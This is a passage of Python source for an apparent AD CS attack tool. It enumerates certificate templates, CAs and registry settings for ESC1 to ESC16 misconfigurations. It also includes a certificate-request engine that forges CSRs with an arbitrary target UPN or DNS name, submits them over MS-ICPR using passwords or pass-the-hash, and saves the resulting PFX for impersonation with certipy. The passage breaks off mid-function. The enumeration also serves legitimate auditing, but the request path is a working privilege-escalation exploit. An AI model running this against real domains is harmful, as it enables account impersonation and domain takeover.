                self.results["templates"].append(template)

                self._check_esc1(template)
                self._check_esc2(template)
                self._check_esc3(template)
                self._check_esc4(template)
                self._check_esc9(template)
                self._check_esc15(template)

            print(Fore.GREEN + f"[+] Found {len(self.results['templates'])} templates" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Template enumeration error: {e}" + Style.RESET_ALL)

    def _parse_template(self, entry):
        """Parse LDAP entry into template dictionary."""
        template = {
            "name": str(entry.cn) if hasattr(entry, 'cn') else "Unknown",
            "schema_version": int(entry["msPKI-Template-Schema-Version"]) if hasattr(entry, 'msPKI-Template-Schema-Version') and entry["msPKI-Template-Schema-Version"] else 1,
            "name_flags": int(entry["msPKI-Certificate-Name-Flag"]) if hasattr(entry, 'msPKI-Certificate-Name-Flag') and entry["msPKI-Certificate-Name-Flag"] else 0,
            "enrollment_flags": int(entry["msPKI-Enrollment-Flag"]) if hasattr(entry, 'msPKI-Enrollment-Flag') and entry["msPKI-Enrollment-Flag"] else 0,
            "ekus": list(entry["pKIExtendedKeyUsage"]) if hasattr(entry, 'pKIExtendedKeyUsage') and entry["pKIExtendedKeyUsage"] else [],
            "app_policies": list(entry["msPKI-Certificate-Application-Policy"]) if hasattr(entry, 'msPKI-Certificate-Application-Policy') and entry["msPKI-Certificate-Application-Policy"] else [],
            "ra_signature": int(entry["msPKI-RA-Signature"]) if hasattr(entry, 'msPKI-RA-Signature') and entry["msPKI-RA-Signature"] else 0,
            "max_issuing_depth": int(entry["pKIMaxIssuingDepth"]) if hasattr(entry, 'pKIMaxIssuingDepth') and entry["pKIMaxIssuingDepth"] else 0,
            "enrollee_supplies_subject": False,
            "client_auth": False,
            "server_auth": False,
            "any_purpose": False,
            "cert_request_agent": False,
            "no_security_extension": False,
            "manager_approval": False,
            "requires_signature": False,
            "enroll_permissions": [],
            "dangerous_permissions": [],
            "enabled": False
        }

        template["enrollee_supplies_subject"] = bool(template["name_flags"] & self.CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
        template["no_security_extension"] = bool(template["enrollment_flags"] & self.CT_FLAG_NO_SECURITY_EXTENSION)
        template["manager_approval"] = bool(template["enrollment_flags"] & self.CT_FLAG_PEND_ALL_REQUESTS)
        template["requires_signature"] = template["ra_signature"] > 0

        for eku in template["ekus"]:
            if eku == self.EKU_CLIENT_AUTH or eku == self.EKU_SMART_CARD or eku == self.EKU_PKINIT_CLIENT:
                template["client_auth"] = True
            if eku == self.EKU_SERVER_AUTH:
                template["server_auth"] = True
            if eku == self.EKU_ANY_PURPOSE:
                template["any_purpose"] = True
            if eku == self.EKU_CERT_REQUEST_AGENT:
                template["cert_request_agent"] = True

        if hasattr(entry, 'nTSecurityDescriptor') and entry.nTSecurityDescriptor and self.acl_parser:
            try:
                sd_bytes = entry.nTSecurityDescriptor.value
                template["enroll_permissions"] = self.acl_parser.check_enroll_permissions(sd_bytes, self.current_user_sid)
                template["dangerous_permissions"] = self.acl_parser.check_dangerous_permissions(sd_bytes)
            except:
                pass

        return template

    def _check_esc1(self, template):
        base_conditions = (
            template["enrollee_supplies_subject"] and 
            template["client_auth"] and 
            not template["manager_approval"] and 
            not template["requires_signature"]
        )
        if not base_conditions:
            return

        has_enroll = len(template["enroll_permissions"]) > 0
        has_dangerous = len(template["dangerous_permissions"]) > 0

        if has_enroll or has_dangerous:
            if "ESC1" not in self.results["vulnerabilities"]:
                self.results["vulnerabilities"]["ESC1"] = []
            self.results["vulnerabilities"]["ESC1"].append({
                "template": template["name"],
                "enroll_access": has_enroll,
                "dangerous_acl": has_dangerous
            })
            status = "VULNERABLE" if has_enroll else "POTENTIAL"
            color = Fore.RED if has_enroll else Fore.YELLOW
            print(color + f"    [!] ESC1 {status}: {template['name']}" + Style.RESET_ALL)

    def _check_esc2(self, template):
        if ((template["any_purpose"] or len(template["ekus"]) == 0) and
            not template["manager_approval"] and not template["requires_signature"]):
            has_enroll = len(template["enroll_permissions"]) > 0
            has_dangerous = len(template["dangerous_permissions"]) > 0
            if has_enroll or has_dangerous:
                if "ESC2" not in self.results["vulnerabilities"]:
                    self.results["vulnerabilities"]["ESC2"] = []
                self.results["vulnerabilities"]["ESC2"].append(template["name"])
                print(Fore.RED + f"    [!] ESC2 VULNERABLE: {template['name']}" + Style.RESET_ALL)

    def _check_esc3(self, template):
        if template["cert_request_agent"] and not template["manager_approval"]:
            has_enroll = len(template["enroll_permissions"]) > 0
            if has_enroll:
                if "ESC3" not in self.results["vulnerabilities"]:
                    self.results["vulnerabilities"]["ESC3"] = []
                self.results["vulnerabilities"]["ESC3"].append(template["name"])
                print(Fore.RED + f"    [!] ESC3 POTENTIAL: {template['name']}" + Style.RESET_ALL)

    def _check_esc4(self, template):
        if not template["dangerous_permissions"]:
            return
        esc4_perms = ["GenericAll", "GenericWrite", "WriteDACL", "WriteOwner", "WriteProperty"]
        has_esc4 = False
        for perm in template["dangerous_permissions"]:
            for risk in perm["risks"]:
                if risk in esc4_perms:
                    has_esc4 = True
                    break
            if has_esc4:
                break
        if has_esc4:
            if "ESC4" not in self.results["vulnerabilities"]:
                self.results["vulnerabilities"]["ESC4"] = []
            self.results["vulnerabilities"]["ESC4"].append(template["name"])
            print(Fore.RED + f"    [!] ESC4 VULNERABLE: {template['name']}" + Style.RESET_ALL)
            for perm in template["dangerous_permissions"]:
                print(Fore.YELLOW + f"        - {perm['sid']}: {', '.join(perm['risks'])}" + Style.RESET_ALL)

    def _check_esc9(self, template):
        if template["no_security_extension"] and template["client_auth"]:
            has_enroll = len(template["enroll_permissions"]) > 0
            if has_enroll:
                if "ESC9" not in self.results["vulnerabilities"]:
                    self.results["vulnerabilities"]["ESC9"] = []
                self.results["vulnerabilities"]["ESC9"].append(template["name"])
                print(Fore.RED + f"    [!] ESC9 VULNERABLE: {template['name']}" + Style.RESET_ALL)

    def _check_esc15(self, template):
        if (template["schema_version"] == 1 and 
            template["enrollee_supplies_subject"] and not template["manager_approval"]):
            has_enroll = len(template["enroll_permissions"]) > 0
            has_dangerous = len(template["dangerous_permissions"]) > 0
            if has_enroll or has_dangerous:
                if "ESC15" not in self.results["vulnerabilities"]:
                    self.results["vulnerabilities"]["ESC15"] = []
                self.results["vulnerabilities"]["ESC15"].append(template["name"])
                print(Fore.RED + f"    [!] ESC15 VULNERABLE: {template['name']}" + Style.RESET_ALL)

    def enumerate_pki_objects(self):
        """Enumerate PKI objects for ESC5/ESC7."""
        print(Fore.YELLOW + "\n[*] Enumerating PKI Objects & ACLs..." + Style.RESET_ALL)

        # NTAuthCertificates
        search_base = f"CN=NTAuthCertificates,CN=Public Key Services,CN=Services,{self.config_dn}"
        try:
            self.conn.search(search_base, "(objectClass=certificationAuthority)",
                            attributes=["cn", "cACertificate", "nTSecurityDescriptor"],
                            controls=[security_descriptor_control()])

            self.results["pki_objects"]["ntauth_certs"] = len(self.conn.entries)
            print(Fore.WHITE + f"    [*] NTAuthCertificates: {len(self.conn.entries)}" + Style.RESET_ALL)

            for entry in self.conn.entries:
                if hasattr(entry, 'nTSecurityDescriptor') and entry.nTSecurityDescriptor and self.acl_parser:
                    try:
                        sd_bytes = entry.nTSecurityDescriptor.value
                        dangerous = self.acl_parser.check_dangerous_permissions(sd_bytes)
                        if dangerous:
                            if "ESC5" not in self.results["vulnerabilities"]:
                                self.results["vulnerabilities"]["ESC5"] = []
                            self.results["vulnerabilities"]["ESC5"].append({"object": "NTAuthCertificates", "dangers": dangerous})
                            print(Fore.RED + f"    [!] ESC5: NTAuthCertificates has dangerous ACLs!" + Style.RESET_ALL)
                    except:
                        pass
        except Exception as e:
            print(Fore.YELLOW + f"    [*] NTAuthCertificates skipped: {e}" + Style.RESET_ALL)

        # CA objects for ESC7
        search_base = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{self.config_dn}"
        try:
            self.conn.search(search_base, "(objectClass=pKIEnrollmentService)",
                            attributes=["cn", "nTSecurityDescriptor"],
                            controls=[security_descriptor_control()])

            print(Fore.WHITE + f"    [*] CA objects: {len(self.conn.entries)}" + Style.RESET_ALL)

            for entry in self.conn.entries:
                if hasattr(entry, 'nTSecurityDescriptor') and entry.nTSecurityDescriptor and self.acl_parser:
                    try:
                        sd_bytes = entry.nTSecurityDescriptor.value
                        dangerous = self.acl_parser.check_dangerous_permissions(sd_bytes)
                        esc7_perms = ["GenericAll", "AllExtendedRights"]
                        has_esc7 = any(risk in esc7_perms for perm in dangerous for risk in perm["risks"])

                        if has_esc7:
                            ca_name = str(entry.cn) if hasattr(entry, 'cn') else "Unknown"
                            if "ESC7" not in self.results["vulnerabilities"]:
                                self.results["vulnerabilities"]["ESC7"] = []
                            self.results["vulnerabilities"]["ESC7"].append(ca_name)
                            print(Fore.RED + f"    [!] ESC7 VULNERABLE: {ca_name}" + Style.RESET_ALL)
                    except:
                        pass
        except Exception as e:
            print(Fore.YELLOW + f"    [*] CA ACL skipped: {e}" + Style.RESET_ALL)

    def check_web_enrollment(self):
        """Check for ESC8 with HTTP endpoint verification."""
        print(Fore.YELLOW + "\n[*] Checking Web Enrollment (ESC8)..." + Style.RESET_ALL)

        for ca in self.results["cas"]:
            hostname = ca.get("dns_hostname", "") or self.dc_ip

            web_found = False
            for port in [80, 443]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.dc_ip, port))

                    probe = f"HEAD /certsrv/ HTTP/1.1\r\nHost: {hostname}\r\nConnection: close\r\n\r\n"
                    sock.send(probe.encode())
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    sock.close()

                    if any(x in response.lower() for x in ["certsrv", "microsoft-cryptoapi", "401", "403"]):
                        web_found = True
                        ca["has_web_enrollment"] = True
                        ca["web_enrollment_url"] = f"http{'s' if port == 443 else ''}://{hostname}:{port}/certsrv/"

                        if port == 80:
                            print(Fore.RED + f"    [!] ESC8 CONFIRMED: Web Enrollment on HTTP!" + Style.RESET_ALL)
                        else:
                            print(Fore.YELLOW + f"    [*] Web Enrollment on HTTPS: {hostname}:{port}" + Style.RESET_ALL)
                        break
                except:
                    pass

            if not web_found:
                print(Fore.WHITE + f"    [-] No Web Enrollment on {hostname}" + Style.RESET_ALL)

    def check_issuance_policies(self):
        """Check for ESC13."""
        print(Fore.YELLOW + "\n[*] Checking Issuance Policies (ESC13)..." + Style.RESET_ALL)

        search_base = f"CN=OID,CN=Public Key Services,CN=Services,{self.config_dn}"
        try:
            self.conn.search(search_base, "(objectClass=msPKI-Enterprise-Oid)",
                            attributes=["cn", "msDS-OIDToGroupLink", "displayName"])

            for entry in self.conn.entries:
                if hasattr(entry, 'msDS-OIDToGroupLink') and entry.msDS-OIDToGroupLink:
                    group_link = str(entry.msDS-OIDToGroupLink)
                    oid_name = str(entry.displayName) if hasattr(entry, 'displayName') else str(entry.cn)

                    if "ESC13" not in self.results["vulnerabilities"]:
                        self.results["vulnerabilities"]["ESC13"] = []
                    self.results["vulnerabilities"]["ESC13"].append({"oid": oid_name, "group": group_link})
                    print(Fore.RED + f"    [!] ESC13: {oid_name} -> {group_link}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"    [*] ESC13 skipped: {e}" + Style.RESET_ALL)

    def check_esc14(self):
        """Check for ESC14 - Explicit Certificate Mapping."""
        print(Fore.YELLOW + "\n[*] Checking Explicit Certificate Mapping (ESC14)..." + Style.RESET_ALL)

        try:
            # Search for users with altSecurityIdentities
            self.conn.search(self.base_dn, "(altSecurityIdentities=*)",
                            attributes=["sAMAccountName", "altSecurityIdentities"])

            count = 0
            for entry in self.conn.entries:
                if hasattr(entry, 'altSecurityIdentities') and entry.altSecurityIdentities:
                    count += 1
                    mappings = list(entry.altSecurityIdentities)
                    username = str(entry.sAMAccountName) if hasattr(entry, 'sAMAccountName') else "Unknown"

                    # Check for weak mapping types
                    weak_types = ["X509RFC822", "X509IssuerSubject"]
                    has_weak = any(any(w in m for w in weak_types) for m in mappings)

                    if has_weak:
                        if "ESC14" not in self.results["vulnerabilities"]:
                            self.results["vulnerabilities"]["ESC14"] = []
                        self.results["vulnerabilities"]["ESC14"].append({
                            "user": username,
                            "mappings": mappings
                        })
                        print(Fore.RED + f"    [!] ESC14: {username} has weak certificate mappings!" + Style.RESET_ALL)

            if count == 0:
                print(Fore.WHITE + f"    [-] No altSecurityIdentities found" + Style.RESET_ALL)
            else:
                print(Fore.WHITE + f"    [*] Found {count} users with altSecurityIdentities" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"    [*] ESC14 skipped: {e}" + Style.RESET_ALL)

    def check_registry_escs(self):
        """Check ESC6, ESC10, ESC16 via remote registry."""
        print(Fore.YELLOW + "\n[*] Checking CA Registry Configuration (ESC6/ESC10/ESC16)..." + Style.RESET_ALL)

        for ca in self.results["cas"]:
            ca_ip = ca.get("dns_hostname", self.dc_ip)

            reg = REMOTE_REGISTRY(ca_ip, self.username, self.password, self.hashes, self.domain)
            if not reg.connect():
                print(Fore.YELLOW + f"    [*] Cannot connect to registry on {ca_ip}" + Style.RESET_ALL)
                continue

            # ESC6
            try:
                esc6_result = reg.check_esc6()
                if esc6_result and esc6_result.get("has_editf_attributesubjectaltname2"):
                    if "ESC6" not in self.results["vulnerabilities"]:
                        self.results["vulnerabilities"]["ESC6"] = []
                    self.results["vulnerabilities"]["ESC6"].append(esc6_result)
                    print(Fore.RED + f"    [!] ESC6 VULNERABLE: {esc6_result['ca_name']} has EDITF_ATTRIBUTESUBJECTALTNAME2!" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.YELLOW + f"    [*] ESC6 check failed: {e}" + Style.RESET_ALL)

            # ESC10
            try:
                esc10_result = reg.check_esc10()
                if esc10_result:
                    if "ESC10" not in self.results["vulnerabilities"]:
                        self.results["vulnerabilities"]["ESC10"] = []
                    self.results["vulnerabilities"]["ESC10"].append(esc10_result)

                    if esc10_result.get("certificate_mapping_methods", {}).get("has_upn_mapping"):
                        print(Fore.RED + f"    [!] ESC10 VULNERABLE: UPN certificate mapping enabled!" + Style.RESET_ALL)
                    if esc10_result.get("strong_certificate_binding", {}).get("is_disabled"):
                        print(Fore.RED + f"    [!] ESC10 VULNERABLE: Strong certificate binding disabled!" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.YELLOW + f"    [*] ESC10 check failed: {e}" + Style.RESET_ALL)

            # ESC16
            try:
                esc16_result = reg.check_esc16()
                if esc16_result and esc16_result.get("has_security_ext_disabled"):
                    if "ESC16" not in self.results["vulnerabilities"]:
                        self.results["vulnerabilities"]["ESC16"] = []
                    self.results["vulnerabilities"]["ESC16"].append(esc16_result)
                    print(Fore.RED + f"    [!] ESC16 VULNERABLE: {esc16_result['ca_name']} has SID extension disabled!" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.YELLOW + f"    [*] ESC16 check failed: {e}" + Style.RESET_ALL)

            reg.disconnect()

    def check_esc11(self):
        """Check for ESC11 - RPC interface encryption."""
        print(Fore.YELLOW + "\n[*] Checking RPC Interface Encryption (ESC11)..." + Style.RESET_ALL)

        for ca in self.results["cas"]:
            ca_ip = ca.get("dns_hostname", self.dc_ip)
            ca_name = ca.get("name", "Unknown")

            try:
                # Try to connect without encryption
                string_binding = rf"ncacn_np:{ca_ip}[\pipe\cert]"
                rpctransport = transport.DCERPCTransportFactory(string_binding)

                if self.username and self.password:
                    rpctransport.set_credentials(self.username, self.password, self.domain)
                elif self.hashes:
                    lmhash, nthash = "", ""
                    if ":" in self.hashes:
                        parts = self.hashes.split(":")
                        if len(parts) == 2:
                            lmhash, nthash = parts
                        else:
                            nthash = parts[-1]
                    else:
                        nthash = self.hashes
                    rpctransport.set_credentials(self.username, '', self.domain, lmhash=lmhash, nthash=nthash)

                dce = rpctransport.get_dce_rpc()
                # Try without encryption first
                dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_NONE)
                dce.connect()
                dce.bind(icpr.MSRPC_UUID_ICPR)

                # If we get here without encryption, ESC11 is possible
                if "ESC11" not in self.results["vulnerabilities"]:
                    self.results["vulnerabilities"]["ESC11"] = []
                self.results["vulnerabilities"]["ESC11"].append(ca_name)
                print(Fore.RED + f"    [!] ESC11 VULNERABLE: {ca_name} allows unencrypted RPC!" + Style.RESET_ALL)

                dce.disconnect()

            except Exception as e:
                # If it fails without encryption, it might be enforced
                print(Fore.WHITE + f"    [-] ESC11: {ca_name} RPC encryption enforced or unavailable" + Style.RESET_ALL)

    def save_results(self, output_file):
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, default=str)
            print(Fore.GREEN + f"[+] Results saved to: {output_file}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Failed to save: {e}" + Style.RESET_ALL)

    def run_full_enum(self):
        if not self.connect():
            return False

        try:
            self.enumerate_cas()
            self.enumerate_templates()
            self.enumerate_pki_objects()
            self.check_web_enrollment()
            self.check_issuance_policies()
            self.check_esc14()
            self.check_esc11()

            # Registry checks require credentials
            if self.username and (self.password or self.hashes):
                self.check_registry_escs()
            else:
                print(Fore.YELLOW + "\n[*] Skipping registry checks (ESC6/ESC10/ESC16) - credentials required" + Style.RESET_ALL)

            print(Fore.CYAN + "\n" + "=" * 75 + Style.RESET_ALL)
            print(Fore.CYAN + "[*] ENUMERATION SUMMARY" + Style.RESET_ALL)
            print(Fore.CYAN + "=" * 75 + Style.RESET_ALL)

            total_vuln = sum(len(v) for v in self.results["vulnerabilities"].values())
            print(Fore.WHITE + f"    Total CAs: {len(self.results['cas'])}" + Style.RESET_ALL)
            print(Fore.WHITE + f"    Total Templates: {len(self.results['templates'])}" + Style.RESET_ALL)
            print(Fore.RED + f"    Total Vulnerabilities: {total_vuln}" + Style.RESET_ALL)

            for esc_id in sorted(self.results["vulnerabilities"].keys()):
                templates = self.results["vulnerabilities"][esc_id]
                severity = ESC_TECHNIQUES.get(esc_id, {}).get("severity", "UNKNOWN")
                color = Fore.RED if severity == "CRITICAL" else Fore.YELLOW if severity == "HIGH" else Fore.WHITE
                print(color + f"    {esc_id}: {len(templates)} finding(s)" + Style.RESET_ALL)

            return True

        except Exception as e:
            print(Fore.RED + f"[!] Enumeration error: {e}" + Style.RESET_ALL)
            import traceback
            traceback.print_exc()
            return False
        finally:
            self.unbind()


# ═══════════════════════════════════════════════════════════════════════════════
# CERTIFICATE REQUEST ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class CERTIFICATE_REQUESTOR:
    """Handle certificate requests via MS-ICPR RPC."""

    def __init__(self, dc_ip, domain, ca_name, username=None, password=None, hashes=None):
        self.dc_ip = dc_ip
        self.domain = domain.upper()
        self.ca_name = ca_name
        self.username = username
        self.password = password
        self.hashes = hashes
        self.dce = None

    def connect_rpc(self):
        try:
            string_binding = rf"ncacn_np:{self.dc_ip}[\pipe\cert]"
            rpctransport = transport.DCERPCTransportFactory(string_binding)

            if self.username and self.password:
                rpctransport.set_credentials(self.username, self.password, self.domain)
            elif self.hashes:
                lmhash, nthash = "", ""
                if ":" in self.hashes:
                    parts = self.hashes.split(":")
                    if len(parts) == 2:
                        lmhash, nthash = parts
                    else:
                        nthash = parts[-1]
                else:
                    nthash = self.hashes
                rpctransport.set_credentials(self.username, '', self.domain, lmhash=lmhash, nthash=nthash)

            self.dce = rpctransport.get_dce_rpc()
            self.dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            self.dce.connect()
            self.dce.bind(icpr.MSRPC_UUID_ICPR)

            print(Fore.GREEN + f"[+] Connected to CA '{self.ca_name}' via RPC" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.RED + f"[!] RPC connection failed: {e}" + Style.RESET_ALL)
            return False

    def create_csr(self, subject_name, alt_upn=None, alt_dns=None, key_size=2048):
        try:
            private_key = rsa.generate_private_key(public_exponent=65537, key_size=key_size)
            subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, subject_name)])

            sans = []
            if alt_upn:
                upn_value = UTF8String(alt_upn)
                upn_der = encoder.encode(upn_value)
                upn_san = x509.OtherName(x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"), upn_der)
                sans.append(upn_san)
            if alt_dns:
                sans.append(x509.DNSName(alt_dns))

            csr_builder = x509.CertificateSigningRequestBuilder().subject_name(subject)
            if sans:
                csr_builder = csr_builder.add_extension(x509.SubjectAlternativeName(sans), critical=False)

            csr = csr_builder.sign(private_key, hashes.SHA256())

            csr_pem = csr.public_bytes(serialization.Encoding.PEM)
            key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
            return csr_pem, key_pem, private_key
        except Exception as e:
            print(Fore.RED + f"[!] CSR creation failed: {e}" + Style.RESET_ALL)
            return None, None, None

    def request_certificate(self, template_name, csr_der, request_attributes=None):
        try:
            if request_attributes is None:
                request_attributes = f"CertificateTemplate:{template_name}\n"

            request = icpr.CertServerRequest()
            request['dwFlags'] = 0
            request['pwszAuthority'] = self.ca_name + "\x00"
            request['pdwRequestId'] = 0
            request['pctbAttribs'] = len(request_attributes)
            request['rgbAttribs'] = request_attributes.encode('utf-16-le')
            request['pctbRequest'] = len(csr_der)
            request['rgbRequest'] = csr_der

            resp = self.dce.request(request)

            if resp['pdwRequestId'] == 0:
                print(Fore.RED + "[!] Certificate request failed or pending" + Style.RESET_ALL)
                return None

            print(Fore.GREEN + f"[+] Request successful! ID: {resp['pdwRequestId']}" + Style.RESET_ALL)
            return resp['pdwRequestId']
        except Exception as e:
            print(Fore.RED + f"[!] Request error: {e}" + Style.RESET_ALL)
            return None

    def retrieve_certificate(self, request_id):
        try:
            request = icpr.CertServerRequest()
            request['dwFlags'] = icpr.CR_IN_BINARY | icpr.CR_IN_PKCS10
            request['pwszAuthority'] = self.ca_name + "\x00"
            request['pdwRequestId'] = request_id
            request['pctbAttribs'] = 0
            request['rgbAttribs'] = b''
            request['pctbRequest'] = 0
            request['rgbRequest'] = b''

            resp = self.dce.request(request)

            if resp['pctbEncodedCert'] > 0:
                cert_der = bytes(resp['rgbEncodedCert'])
                print(Fore.GREEN + "[+] Certificate retrieved" + Style.RESET_ALL)
                return cert_der
            return None
        except Exception as e:
            print(Fore.RED + f"[!] Retrieval error: {e}" + Style.RESET_ALL)
            return None

    def save_pfx(self, cert_der, private_key, filename, password=None):
        try:
            cert = x509.load_der_x509_certificate(cert_der)
            pfx = serialization.pkcs12.serialize_key_and_certificates(
                name=filename.encode(), key=private_key, cert=cert, cas=None,
                encryption_algorithm=serialization.NoEncryption() if not password 
                    else serialization.BestAvailableEncryption(password.encode())
            )
            with open(filename + ".pfx", 'wb') as f:
                f.write(pfx)
            print(Fore.GREEN + f"[+] Saved to {filename}.pfx" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Save failed: {e}" + Style.RESET_ALL)
            return False

    def disconnect(self):
        if self.dce:
            try:
                self.dce.disconnect()
            except:
                pass


# ═══════════════════════════════════════════════════════════════════════════════
# PKINIT AUTHENTICATION (Certificate Analysis Only)
# ═══════════════════════════════════════════════════════════════════════════════

class PKINIT_AUTH:
    """Certificate analysis and info extraction. Full PKINIT requires DH exchange."""

    def __init__(self, dc_ip, domain):
        self.dc_ip = dc_ip
        self.domain = domain.upper()

    def auth_with_pfx(self, pfx_file, pfx_password=None, upn=None):
        try:
            print(Fore.YELLOW + "[*] Analyzing certificate..." + Style.RESET_ALL)

            with open(pfx_file, 'rb') as f:
                pfx_data = f.read()

            pfx = serialization.load_pkcs12(pfx_data, pfx_password.encode() if pfx_password else None)
            cert = pfx.cert.certificate if pfx.cert else None
            key = pfx.key if pfx.key else None

            if not cert or not key:
                print(Fore.RED + "[!] Failed to extract cert/key" + Style.RESET_ALL)
                return False

            # Extract UPN from SAN
            if not upn:
                try:
                    for ext in cert.extensions:
                        if ext.oid == ExtensionOID.SUBJECT_ALTERNATIVE_NAME:
                            for san in ext.value:
                                if isinstance(san, x509.OtherName):
                                    if san.type_id.dotted_string == "1.3.6.1.4.1.311.20.2.3":
                                        decoded, _ = decoder.decode(san.value, UTF8String())
                                        upn = str(decoded)
                                        break
                            if upn:
                                break
                except:
                    pass
                if not upn:
                    for attr in cert.subject:
                        if attr.oid == NameOID.COMMON_NAME:
                            upn = attr.value
                            break

            if not upn:
                print(Fore.RED + "[!] Could not determine UPN" + Style.RESET_ALL)
                return False

            print(Fore.GREEN + f"[+] Identity: {upn}" + Style.RESET_ALL)
            print(Fore.CYAN + "[*] Certificate Info:" + Style.RESET_ALL)
            print(Fore.WHITE + f"    Subject: {cert.subject.rfc4514_string()}" + Style.RESET_ALL)
            print(Fore.WHITE + f"    Issuer: {cert.issuer.rfc4514_string()}" + Style.RESET_ALL)
            print(Fore.WHITE + f"    Serial: {cert.serial_number}" + Style.RESET_ALL)
            print(Fore.WHITE + f"    Valid: {cert.not_valid_before_utc} to {cert.not_valid_after_utc}" + Style.RESET_ALL)

            print(Fore.YELLOW + "\n[!] NOTE: Full PKINIT requires DH key exchange." + Style.RESET_ALL)
            print(Fore.YELLOW + f"[!] Use: certipy auth -pfx {pfx_file} -dc-ip {self.dc_ip}" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Analysis failed: {e}" + Style.RESET_ALL)
            return False


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN WORKFLOW
# ═══════════════════════════════════════════════════════════════════════════════

def run_enumeration(dc_ip, domain, username, password, hashes, output_file, esc_filter=None):
    print(Fore.YELLOW + "\n[*] Starting AD CS Enumeration..." + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Target: {dc_ip} | Domain: {domain}" + Style.RESET_ALL)

    enum = ADCS_ENUMERATOR(dc_ip, domain, username, password, hashes)

    if enum.run_full_enum():
        enum.save_results(output_file)
        return True
    return False


def run_certificate_request(dc_ip, domain, ca_name, template, username, password, hashes, 
                            target_upn=None, target_dns=None, output_file=None):
    print(Fore.YELLOW + "\n[*] Requesting Certificate..." + Style.RESET_ALL)

    req = CERTIFICATE_REQUESTOR(dc_ip, domain, ca_name, username, password, hashes)
    if not req.connect_rpc():
        return False

    try:
        subject = username.split("@")[0] if "@" in username else username.split("\\")[-1]
        csr_pem, key_pem, private_key = req.create_csr(subject, alt_upn=target_upn, alt_dns=target_dns)
        if not csr_pem:
            return False

        csr = x509.load_pem_x509_csr(csr_pem)
        csr_der = csr.public_bytes(serialization.Encoding.DER)

        request_id = req.request_certificate(template, csr_der)
        if not request_id:
            return False

        cert_der = req.retrieve_certificate(request_id)
        if cert_der and output_file:
            req.save_pfx(cert_der, private_key, output_file)
            print(Fore.CYAN + f"\n[*] Auth: certipy auth -pfx {output_file}.pfx -dc-ip {dc_ip}" + Style.RESET_ALL)
        return True
    except Exception as e:
        print(Fore.RED + f"[!] Failed: {e}" + Style.RESET_ALL)
        return False
    finally:
        req.disconnect()


def run_authentication(pfx_file, dc_ip, domain, pfx_password=None):
    print(Fore.YELLOW + "\n[*] Analyzing Certificate..." + Style.RESET_ALL)
    auth = PKINIT_AUTH(dc_ip, domain)
    return auth.auth_with_pfx(pfx_file, pfx_password)


def main():
    banner()

    dc_ip = get_input(Fore.CYAN + "[?] DC IP Address       : " + Style.RESET_ALL, validate_ip, "Invalid IP")
    domain = get_input(Fore.CYAN + "[?] Domain Name         : " + Style.RESET_ALL, validate_domain, "Invalid domain")

    print(Fore.CYAN + "\n[?] Authentication:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Username + Password")
    print(Fore.WHITE + "    2. Pass-the-Hash")
    print(Fore.WHITE + "    3. Anonymous (limited)")

    auth_choice = get_input(Fore.CYAN + "[?] Choice              : " + Style.RESET_ALL, lambda x: x in ['1','2','3'], "Invalid")

    username = password = hashes = None
    if auth_choice == '1':
        username = get_input(Fore.CYAN + "[?] Username : " + Style.RESET_ALL)
        password = get_input(Fore.CYAN + "[?] Password : " + Style.RESET_ALL)
    elif auth_choice == '2':
        username = get_input(Fore.CYAN + "[?] Username : " + Style.RESET_ALL)
        hashes = get_input(Fore.CYAN + "[?] NTLM Hash (LM:NT)   : " + Style.RESET_ALL)

    print(Fore.CYAN + "\n[?] ESC Techniques:" + Style.RESET_ALL)
    print_esc_menu()

    esc_choice = get_input(Fore.CYAN + "[?] ESC ID (e.g. ESC1)  : " + Style.RESET_ALL,
                          lambda x: x.upper() in list(ESC_TECHNIQUES.keys()) + ["ALL"] or x.upper().startswith("ESC"),
                          "Invalid").upper()

    if esc_choice in ESC_TECHNIQUES:
        print_esc_details(esc_choice)

    print(Fore.CYAN + "\n[?] Mode:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Enumerate")
    print(Fore.WHITE + "    2. Request Certificate")
    print(Fore.WHITE + "    3. Analyze PFX")

    mode = get_input(Fore.CYAN + "[?] Choice              : " + Style.RESET_ALL, lambda x: x in ['1','2','3'], "Invalid")

    timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    default_out = f"ceat-results-{timestamp}.json"
    out_input = get_input(Fore.CYAN + f"[?] Output (default: {default_out}): " + Style.RESET_ALL, allow_empty=True)
    output_file = resolve_output_file(out_input if out_input else "", "ceat-results")

    if mode == '1':
        run_enumeration(dc_ip, domain, username, password, hashes, output_file, esc_choice)
    elif mode == '2':
        ca_name = get_input(Fore.CYAN + "[?] CA Name             : " + Style.RESET_ALL)
        template = get_input(Fore.CYAN + "[?] Template Name       : " + Style.RESET_ALL)
        target_upn = get_input(Fore.CYAN + "[?] Target UPN (opt)    : " + Style.RESET_ALL, allow_empty=True)
        target_dns = get_input(Fore.CYAN + "[?] Target DNS (opt)    : " + Style.RESET_ALL, allow_empty=True)
        pfx_out = output_file.replace('.json', '')
